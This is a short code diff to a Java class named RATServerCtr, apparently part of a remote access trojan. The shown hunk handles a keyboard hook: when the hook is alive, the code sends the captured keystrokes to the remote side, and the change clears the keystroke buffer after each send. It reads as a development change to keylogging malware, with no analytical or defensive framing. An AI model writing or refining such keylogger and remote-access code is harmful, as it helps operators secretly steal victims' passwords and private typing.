@@ -78,6 +78,7 @@ public class RATServerCtr {
                     if(keyHook.isAlive()) {
                         sendResult("ok");
                         sendKeys(key);
+                        key.clear();
                         break;
                     }else {
                         sendResult("no");
